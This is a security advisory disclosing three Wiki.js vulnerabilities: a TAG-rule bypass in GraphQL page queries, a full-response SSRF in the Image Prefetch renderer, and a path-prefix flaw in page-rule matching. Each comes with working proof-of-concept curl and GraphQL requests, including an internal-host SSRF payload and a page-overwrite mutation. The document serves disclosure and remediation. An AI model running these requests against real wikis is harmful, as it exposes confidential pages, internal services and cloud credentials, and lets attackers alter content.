https://github.com/requarks/wiki/

## Finding 1: TAG-based Page Rule access restrictions bypassed in pages.list/tree/tags/links GraphQL queries, leaking restricted page metadata

Affected versions: <= 2.5.314

### Disclosure
 - 22 June 2026 - reported via https://github.com/requarks/wiki/security/advisories/GHSA-929r-g35v-wjr4
 - 14 September 2026 - no response; disclosed

### Summary

Wiki.js supports restricting read access to pages by tag through a `TAG`-type Page Rule, configurable per-group from the admin Groups editor ("Tag Matches..." rule type). This is enforced correctly on the live page-view route (`/*` in `server/controllers/common.js`), which returns `403 Unauthorized` and no page content when a `TAG` deny rule applies.

However, several GraphQL queries that list or traverse pages — `pages.list`, `pages.tree`, `pages.tags`, `pages.searchTags`, and `pages.links` — call the same `WIKI.auth.checkAccess()` authorization function but omit the page's `tags` from the object passed in. Since `checkAccess()` can only evaluate a `TAG` rule if `page.tags` is populated, these queries never apply any `TAG` page rule, and a user is allowed to see the metadata of a page that the live page route would deny them. `pages.search` is the only related resolver that correctly includes `tags` (with a comment in the source acknowledging the requirement), demonstrating this is an inconsistency rather than an intentional design choice.

A user who is denied a page through a `TAG` rule (whether through an explicit group, or through the default Guests group when an administrator uses TAG rules to keep most of the wiki public while restricting a tagged subset) can still retrieve via GraphQL:
- The page's title, description, path, publish/privacy flags, and its own tag list (`pages.list`)
- The page's title and path while browsing the page tree (`pages.tree`)
- The names of restricted tags (`pages.tags`, `pages.searchTags`)
- The existence and path of the restricted page as a node in the sitewide link graph, including links pointing to/from it (`pages.links`)

### Details

`server/core/auth.js`:
```js
checkAccess(user, permissions = [], page = false) {
  ...
  if (user.groups) {
    user.groups.forEach(grp => {
      _.get(WIKI.auth.groups, `${grpId}.pageRules`, []).forEach(rule => {
        ...
        if (_.intersection(rule.roles, permissions).length > 0) {
          switch (rule.match) {
            ...
            case 'TAG':
              _.get(page, 'tags', []).forEach(tag => {   // <- empty unless caller passed page.tags
                if (tag.tag === rule.path) { ... }
              })
              break
          }
        }
      })
    })
    return (checkState.match && !checkState.deny)
  }
  return false
}
```

`server/graph/resolvers/page.js` — the only call site that passes `tags`:
```js
async search (obj, args, context) {
  ...
  results: _.filter(resp.results, r => {
    return WIKI.auth.checkAccess(context.req.user, ['read:pages'], {
      path: r.path,
      locale: r.locale,
      tags: r.tags // Tags are needed since access permissions can be limited by page tags too
    })
  })
```

The sibling resolvers omit `tags` entirely, e.g. `list`:
```js
results = _.filter(results, r => {
  return WIKI.auth.checkAccess(context.req.user, ['read:pages'], {
    path: r.path,
    locale: r.locale
  })
})
```
and identically in `tree`, `tags`, `searchTags`, and `links` (the latter checking `read:pages` on both the source and linked page paths, again without tags).

### PoC

Setup (as admin, via GraphQL):
1. Create a page tagged `secret-tag`:
```
mutation { pages { create(
  content:"...", description:"Classified project Falcon roadmap and budget figures",
  editor:"markdown", isPublished:true, isPrivate:false, locale:"en",
  path:"secret/project-falcon", tags:["secret-tag"], title:"Project Falcon - Classified Roadmap"
) { responseResult { succeeded } } } }
```
2. Add a `TAG` deny rule on `secret-tag` to a group the victim belongs to (here shown against the default Guests group, id 2, which already grants `read:pages` via a `START path:""` allow rule):
```
mutation { groups { update(
  id:2, name:"Guests", redirectOnLogin:"/",
  permissions:["read:pages","read:assets","read:comments"],
  pageRules:[
    {id:"guest", deny:false, match:START, roles:["read:pages","read:assets","read:comments"], path:"", locales:[]},
    {id:"<uuid>", deny:true, match:TAG, roles:["read:pages","read:assets","read:comments"], path:"secret-tag", locales:[]}
  ]
) { responseResult { succeeded } } } }
```

Exploit (no authentication at all):
```
curl -s http://[REDACTED]:3000/en/secret/project-falcon
-> HTTP/1.1 403 Forbidden  (renders "Unauthorized")

curl -s -X POST http://[REDACTED]:3000/graphql -H "Content-Type: application/json" -d \
  '{"query":"query{pages{list(orderBy:PATH){id path title description isPublished tags}}}"}'
-> {"data":{"pages":{"list":[{"id":1,"path":"secret/project-falcon",
     "title":"Project Falcon - Classified Roadmap",
     "description":"Classified project Falcon roadmap and budget figures",
     "isPublished":true,"tags":["secret-tag"]}]}}}

curl -s -X POST http://[REDACTED]:3000/graphql -H "Content-Type: application/json" -d \
  '{"query":"query{pages{tree(mode:ALL,locale:\"en\",parent:1){id path title}}}"}'
-> {"data":{"pages":{"tree":[{"id":2,"path":"secret/project-falcon",
     "title":"Project Falcon - Classified Roadmap"}]}}}
```
Both GraphQL responses disclose the title, description, and tag of a page the same anonymous client is denied at `/en/secret/project-falcon`.

### Impact

Any user — including a fully unauthenticated visitor when the restriction is applied to the Guests group, or any authenticated low-privilege user when applied to a custom group — can enumerate the titles, descriptions, paths, publish status, and tag names of every page an administrator has restricted via a TAG-based page rule, plus discover such pages' existence and position in the site's internal link graph via `pages.links`. For deployments that rely on TAG rules to hide a class of sensitive pages (e.g., HR, legal, security-incident, or embargoed-content tags) while keeping the rest of the wiki browsable, this defeats the confidentiality guarantee the feature exists to provide, without requiring any write access or special privilege beyond whatever permission level already grants `read:pages`.

### Remediation

In `server/graph/resolvers/page.js`, include `tags` in every `page` object passed to `WIKI.auth.checkAccess()` for the `read:pages`-gated resolvers `list`, `tree`, `tags`, `searchTags`, and `links` (and `single`/`singleByPath` for consistency), mirroring the existing pattern already used in `search()`. This requires loading the `tags` relation for `tree`/`links` (currently not joined) in addition to `list`, which already joins `tags` but drops it before the access check.


## Finding 2: Server-Side Request Forgery via the Image Prefetch renderer (no URL/host validation on fetched image src)

Affected versions: <= 2.5.314 (commit 6f042e97cc2d3acda6b6ff611de8e0faacce91c1)

### Disclosure
 - 6 July 2026 - reported via https://github.com/requarks/wiki/security/advisories/GHSA-3jcj-pp6m-ggg5
 - 14 September 2026 - no response; disclosed

### Summary

Wiki.js includes an optional "Image Prefetch" renderer intended to cache remotely-rendered diagram images (from kroki/plantuml) as inline base64 data. When enabled, this renderer fetches the `src` attribute of any `<img class="prefetch-candidate">` element found in a page's rendered HTML, with no restriction on protocol, host, or destination IP address. Any user who can write page content (which can include a raw `<img>` tag placed directly in Markdown, since Wiki.js's Markdown renderer allows raw HTML by default) can force the Wiki.js server to issue an arbitrary outbound HTTP GET request, and the response body is base64-encoded and embedded directly back into the page, making the response readable by the same user through the browser.

This was reproduced end-to-end: after enabling the renderer, a page containing `<img class="prefetch-candidate" src="http://ssrf-target/secret.txt">` caused the Wiki.js server container to fetch that internal-only URL and return its exact contents to the requesting user as a `data:` URI in the rendered page.

### Details

`server/modules/rendering/html-image-prefetch/renderer.js`:

```js
const request = require('request-promise')

const prefetch = async (element) => {
  const url = element.attr(`src`)
  let response
  try {
    response = await request({
      method: `GET`,
      url,
      resolveWithFullResponse: true
    })
  } catch (err) {
    WIKI.logger.warn(`Failed to prefetch ${url}`)
    WIKI.logger.warn(err)
    return
  }
  const contentType = response.headers[`content-type`]
  const image = Buffer.from(response.body).toString('base64')
  element.attr('src', `data:${contentType};base64,${image}`)
  element.removeClass('prefetch-candidate')
}

module.exports = {
  async init($) {
    const promises = $('img.prefetch-candidate').map((index, element) => {
      return prefetch($(element))
    }).toArray()
    await Promise.all(promises)
  }
}
```

There is no allowlist of hosts, no scheme restriction (an attacker is only limited by what `request-promise`'s default agent supports, which includes `http://` and `https://` to any host, including RFC 1918 private ranges and link-local addresses such as cloud instance metadata services), and no size limit on the fetched body before it is base64-encoded and re-embedded in the page.

Per `server/modules/rendering/html-image-prefetch/definition.yml`, this module `dependsOn: htmlCore` with no explicit `step`, which the rendering pipeline (`server/models/renderers.js` `getRenderingPipeline()`) treats as a pre-sanitization step: in `server/modules/rendering/html-core/renderer.js`, children without `step: post` run before the `html-security` sanitizer (`step: post`, `order: 99999`). This means the outbound network request happens unconditionally during rendering, before any HTML sanitization takes place, and is not affected by the sanitizer's tag/attribute allowlist.

The feature is disabled by default (`enabledDefault: false`); an administrator must enable "Image Prefetch" under Administration > Rendering. Once enabled, it applies globally to every page render, and any user who can edit any page (`write:pages` on that page, which can be a narrowly-scoped permission) can trigger it - there is no separate, more privileged permission gate on this behavior.

### PoC

Environment: `requarks/wiki:2` Docker image (Wiki.js 2.5.314) + PostgreSQL 15.

1. Enabled the renderer (simulating the admin toggle under Administration > Rendering):
   ```
   UPDATE renderers SET "isEnabled" = true WHERE key = 'htmlImagePrefetch';
   ```
   Confirmed via GraphQL as admin: `{"key":"htmlImagePrefetch","isEnabled":true}`.

2. Started an internal-only HTTP server on the same Docker network as the wiki container, not exposed outside that network, serving a known secret:
   ```
   $ echo "SSRF-PROOF-INTERNAL-SECRET-12345" > /tmp/ssrf_target_www/secret.txt
   $ docker run -d --rm --name ssrf-target --network docker_default \
       -v /tmp/ssrf_target_www:/usr/share/nginx/html:ro -p 127.0.0.1:8098:80 nginx:alpine
   ```

3. Created a page containing a raw HTML `<img>` tag with the prefetch-candidate class, via the standard page-create GraphQL mutation, editor `markdown` (Markdown "Allow HTML" is enabled by default):
   ```
   POST /graphql
   {
     "query": "mutation($content:String! ...){pages{create(...){...}}}",
     "variables": {
       "content": "# SSRF test\n\n<img class=\"prefetch-candidate\" src=\"http://ssrf-target/secret.txt\">\n",
       "path": "ssrf-test", "editor": "markdown", "locale": "en", "title": "SSRF Test", ...
     }
   }
   ```
   Response: `{"data":{"pages":{"create":{"responseResult":{"succeeded":true,...},"page":{"id":4,"path":"ssrf-test"}}}}}`

4. Viewed the page to trigger server-side rendering:
   ```
   $ curl -s http://localhost:3000/en/ssrf-test -H "Authorization: Bearer $JWT" -o /tmp/ssrf_test.html -w "%{http_code}\n"
   200
   ```

5. The rendered HTML contained the server's fetch result, base64-encoded:
   ```
   $ grep -o "data:[^\"]\{0,80\}" /tmp/ssrf_test.html
   data:text/plain;base64,U1NSRi1QUk9PRi1JTlRFUk5BTC1TRUNSRVQtMTIzNDUK

   $ echo "U1NSRi1QUk9PRi1JTlRFUk5BTC1TRUNSRVQtMTIzNDUK" | base64 -d
   SSRF-PROOF-INTERNAL-SECRET-12345
   ```

6. The internal target's access log confirms the request originated from the wiki container itself, not from the operator's browser or host:
   ```
   $ docker logs ssrf-target --tail 5
   172.20.0.3 - - [06/Jul/2026:11:49:10 +0000] "GET /secret.txt HTTP/1.1" 200 33 "-" "-" "-"
   ```
   (`172.20.0.3` is the `wikitest-app` container's address on the shared Docker network.)

A reusable script is included at `scripts/002_image_prefetch_ssrf_poc.sh`.

### Impact

Once an administrator enables the Image Prefetch renderer (a documented, legitimate convenience feature for diagram caching), any user who can edit page content can make the Wiki.js server perform arbitrary outbound HTTP requests to hosts of their choosing, including internal-network-only services and, in cloud deployments, the cloud provider's instance metadata endpoint (a common source of temporary IAM credentials). The response body is returned directly to the requesting user, embedded in the page as a base64 data URI, so this is a full-response SSRF, not just a blind one: an attacker can read back the contents of whatever internal resource they targeted. There is no dedicated permission gate beyond ordinary page-write access, so the blast radius includes any editor account, not just administrators.


## Finding 3: Page permission rule engine grants read/write access to any page whose path shares a literal prefix with an allowed path (no path-segment boundary check)

Affected versions: <= 2.5.314 (commit 6f042e97cc2d3acda6b6ff611de8e0faacce91c1)

### Disclosure
 - 6 July 2026 - reported via https://github.com/requarks/wiki/security/advisories/GHSA-9p4x-8wcm-8jpx
 - 14 September 2026 - no response; disclosed

### Summary

Wiki.js grants page-level permissions through per-group "Page Rules" that match a page's path using one of `START`, `END`, `EXACT`, `REGEX`, or `TAG`. The `START` and `END` matchers are implemented as plain string prefix/suffix comparisons with no requirement that the match end on a path separator. As a result, a rule intended to scope a group to one folder (for example `path: "projects/public"`, match `START`) also matches any unrelated page whose path happens to start with the same characters (for example `projects/public-confidential-financials`), even though that page is not a descendant of the intended folder.

Because every page-scoped permission check (`read:pages`, `write:pages`, `read:history`, `read:source`, `read:comments`, `read:assets`, `manage:pages`, `delete:pages`, etc.) is routed through this same matching function, a restricted user can both read and edit pages that an administrator explicitly did not intend to grant them access to, using nothing more than a page whose name happens to share a prefix with their permitted folder.

This was reproduced end-to-end: a user in a group granted only read (and, in a second test, write) access to `projects/public` was able to read the full content of, and then overwrite the content of, a page at `projects/public-confidential-financials` - a page outside the intended folder - while a genuinely unrelated page (`other/secret`) correctly remained inaccessible.

### Details

`server/core/auth.js`, function `checkAccess()`:

```js
// server/core/auth.js (lines 254-263)
switch (rule.match) {
  case 'START':
    if (_.startsWith(`/${page.path}`, `/${rule.path}`)) {
      checkState = this._applyPageRuleSpecificity({ rule, checkState, higherPriority: ['END', 'REGEX', 'EXACT', 'TAG'] })
    }
    break
  case 'END':
    if (_.endsWith(page.path, rule.path)) {
      checkState = this._applyPageRuleSpecificity({ rule, checkState, higherPriority: ['REGEX', 'EXACT', 'TAG'] })
    }
    break
```

`_.startsWith('/${page.path}', '/${rule.path}')` is a literal character-by-character prefix test. There is no check that the character immediately following the matched prefix is `/` (or that the strings are equal). Consequently a rule with `path: "projects/public"` matches all of:

- `projects/public` (intended)
- `projects/public/welcome` (intended, an actual child page)
- `projects/public-confidential-financials` (NOT intended - a sibling page, not a descendant)
- `projects/publicity`, `projects/public2`, etc. (any lexical sibling)

The same problem applies symmetrically to `END` matches via `_.endsWith()`.

This function is the single choke point for essentially all page-scoped authorization in the application - it is called from the page controller (`server/controllers/common.js:298` `read:pages`, `:76` `read:history`, `:81` `read:source`, `:576` `read:assets`), from the page-tree GraphQL resolver used to populate the folder browser (`server/graph/resolvers/page.js:286`), and from `server/models/pages.js:378` (`updatePage`, `write:pages`) which is reached after the page is looked up by its own database ID (this part was correctly hardened in the CVE-2022-23654 fix, so the *lookup* uses the page's stored path - but that stored path is then run through the same flawed matcher).

Contrast with the `EXACT` matcher a few lines below, which is implemented correctly and is not affected:

```js
case 'EXACT':
  if (`/${page.path}` === `/${rule.path}`) { ... }
```

An open (unmerged as of the time of this report) pull request, #8013, reworks the specificity-ranking algorithm used to arbitrate between overlapping rules, but keeps the exact vulnerable `_.startsWith`/`_.endsWith` lines unchanged, so this issue would not be fixed by that PR as currently written.

### PoC

Environment: `requarks/wiki:2` Docker image (Wiki.js 2.5.314) + PostgreSQL 15, default docker-compose setup, freshly installed.

Setup performed as the site Administrator (`admin@wiki.local`):

1. Created group id=3 "Restricted" with global permissions `[read:pages, read:comments, read:assets, write:pages]` and a single page rule:
   ```json
   { "id": "rule1", "deny": false, "match": "START", "roles": ["read:pages","read:comments","read:assets","write:pages"], "path": "projects/public", "locales": [] }
   ```
2. Created user `restricted@wiki.local` / `RestrictedPass123!`, member of group 3 only.
3. Created three pages as admin:
   - id=1 `projects/public/welcome` - intended to be in-scope
   - id=2 `projects/public-confidential-financials` - sibling path, NOT intended to be in-scope, content: `"CONFIDENTIAL: Q4 layoff plan and executive salary details. This must NOT be readable by the Restricted group."`
   - id=3 `other/secret` - unrelated control page

Logged in as the restricted user via GraphQL:

```
POST /graphql
{"query":"mutation{authentication{login(username:\"restricted@wiki.local\",password:\"RestrictedPass123!\",strategy:\"local\"){responseResult{succeeded errorCode message} jwt}}}"}
```
Response confirmed `permissions:["read:pages","read:comments","read:assets","write:pages"]`, `groups:[3]`.

Read bypass, using the restricted user's JWT as a Bearer token:

```
$ curl -s -o /tmp/allowed_page.html -w "HTTP status: %{http_code}\n" \
  http://localhost:3000/en/projects/public/welcome -H "Authorization: Bearer $RJWT"
HTTP status: 200
"Welcome to the public project page. This is intended to be readable by the Restricted group."

$ curl -s -o /tmp/denied_page.html -w "HTTP status: %{http_code}\n" \
  http://localhost:3000/en/projects/public-confidential-financials -H "Authorization: Bearer $RJWT"
HTTP status: 200
"CONFIDENTIAL: Q4 layoff plan and executive salary details. This must NOT be readable by the Restricted group."
```

Sanity control confirming the group is genuinely restrictive:

```
$ curl -s -o /tmp/control_page.html -w "HTTP status: %{http_code}\n" \
  http://localhost:3000/en/other/secret -H "Authorization: Bearer $RJWT"
HTTP status: 403
"Unauthorized"
```

Write bypass, using GraphQL `pages.update` against page id=2 (the out-of-scope sibling):

```
POST /graphql
{
  "query": "mutation($id:Int!,$content:String!,$description:String!,$editor:String!,$isPublished:Boolean!,$isPrivate:Boolean!,$locale:String!,$path:String!,$tags:[String]!,$title:String!){pages{update(id:$id,content:$content,description:$description,editor:$editor,isPublished:$isPublished,isPrivate:$isPrivate,locale:$locale,path:$path,tags:$tags,title:$title){responseResult{succeeded errorCode message} page{id path}}}}",
  "variables": {"id":2,"content":"PWNED by restricted user via page-rule prefix bypass.","description":"secret page","editor":"markdown","isPublished":true,"isPrivate":false,"locale":"en","path":"projects/public-confidential-financials","tags":[],"title":"Confidential Financials"}
}
```

Response:
```json
{"data":{"pages":{"update":{"responseResult":{"succeeded":true,"errorCode":0,"message":"Page has been updated."},"page":{"id":2,"path":"projects/public-confidential-financials"}}}}}
```

Confirmed as admin that the content changed and the author is now the restricted user:
```json
{"data":{"pages":{"single":{"id":2,"path":"projects/public-confidential-financials","content":"PWNED by restricted user via page-rule prefix bypass.","authorId":3,"authorName":"Restricted User"}}}}
```

Control write attempt against the unrelated page id=3 (`other/secret`) was correctly rejected:
```json
{"data":{"pages":{"update":{"responseResult":{"succeeded":false,"errorCode":6009,"message":"You are not authorized to update this page."},"page":null}}}}
```

A reusable script is included at `scripts/001_page_rule_prefix_bypass_poc.sh`.

### Impact

Any user placed in a group whose page rules use a `START` or `END` match (the two most commonly used matchers, used to scope a group to a folder or a namespace) can read and modify content on any page whose path happens to share the same literal prefix or suffix, even though that page was never intended to be in scope. This breaks the core guarantee of the page-rule system: that a group scoped to one part of the wiki cannot see or change content elsewhere. The same underlying function also gates page history, page source, and page assets, so the same bypass extends to those as well. Any wiki using folder-style delegated editing (a very common Wiki.js configuration for multi-team wikis) is affected as soon as two top-level page names share a prefix, which is a routine, easy-to-hit naming collision rather than an unusual edge case.
